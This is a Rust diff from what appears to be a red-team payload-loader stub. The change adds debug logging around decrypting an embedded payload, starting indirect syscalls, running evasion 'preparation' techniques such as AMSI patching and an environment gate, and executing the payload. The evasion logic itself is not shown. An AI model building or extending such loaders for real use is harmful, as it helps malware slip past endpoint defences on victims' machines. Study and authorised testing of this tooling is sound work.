@@ -69,23 +69,28 @@ fn run() -> Result<i32, String> {
     //    signal (it replaces the old modal marker dialog, which blocked
     //    automated runs); it only prints once decryption succeeded.
     eprintln!("{stub_marker}");
+    crate::tech_dbg!("stub", "payload decrypted ({} bytes)", image.len());
 
     // 4. Initialize the syscall layer. A no-op unless the build sets
     //    `build.stub.syscalls.mode: indirect`.
     init_syscalls()?;
+    crate::tech_dbg!("stub", "syscall layer initialized");
 
     // 5. Run the Preparation techniques (process-state modifications, e.g.
     //    patching AMSI). `run_preparations` is assembled from the active
     //    preparation fragments; it returns `false` when one of them (e.g. the
     //    `bouncer` environment gate) decided to abort before the payload runs.
+    crate::tech_dbg!("stub", "running the preparation techniques");
     if !run_preparations()? {
         // A preparation declined the host. Exit without touching the payload;
         // the technique already chose its own exit behaviour (silent vs exit 1).
+        crate::tech_dbg!("stub", "a preparation aborted the pipeline; payload not run");
         std::process::exit(0);
     }
 
     // 6. Run the payload with the selected Execution technique.
     //    `execute_payload` is provided by the active execution fragment.
+    crate::tech_dbg!("stub", "executing the payload");
     execute_payload(&mut image)
 }
 
